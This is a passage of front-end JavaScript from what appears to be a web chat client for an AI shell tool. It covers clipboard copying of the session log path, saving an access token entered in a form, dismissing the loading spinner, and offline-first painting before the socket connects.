    done();
  };
  if (navigator.clipboard?.writeText) {
    navigator.clipboard.writeText(text).then(done, fallback);
  } else {
    fallback();
  }
}

// /session and the ⋯ menu's "Copy log path": copy the session's JSONL log path.
function copyLogPath() {
  if (!currentLogPath) { showToast("no chat log yet"); return; }
  copyToClipboard(currentLogPath, "log path");
}

$("token-form").addEventListener("submit", (e) => {
  e.preventDefault();
  const value = $("token-input").value.trim();
  if (!value) return;
  localStorage.setItem("aish-token", value);
  location.reload(); // reconnect with the new token from a clean slate
});

// [BOOTLOADER-START]
// The first-paint spinner (index.html) is dismissed the moment the app has
// something real to show — whichever path gets there first: the socket's hello,
// the offline mirror's paint, or the token gate. Idempotent (each path may fire),
// and a safety timer clears it even if boot wedges, so it can never strand the
// user on a spinner.
function hideBootLoader() {
  const el = document.getElementById("boot-loader");
  if (!el || el.classList.contains("hide")) return;
  el.classList.add("hide");
  setTimeout(() => el.remove(), 300); // after the fade; removes it from the tree
}
setTimeout(hideBootLoader, 10000); // backstop: never trap behind the spinner
// [BOOTLOADER-END]

// Paint the last chat from the mirror, then open the socket. Not awaited: an
// IndexedDB hiccup must never delay the connection, and whichever finishes
// first is correct — a server replay overwrites the cached paint, and the
// cached paint checks serverPainted before touching the DOM.
offlineFirstPaint();
offlineRefreshMetaMap();
connect();
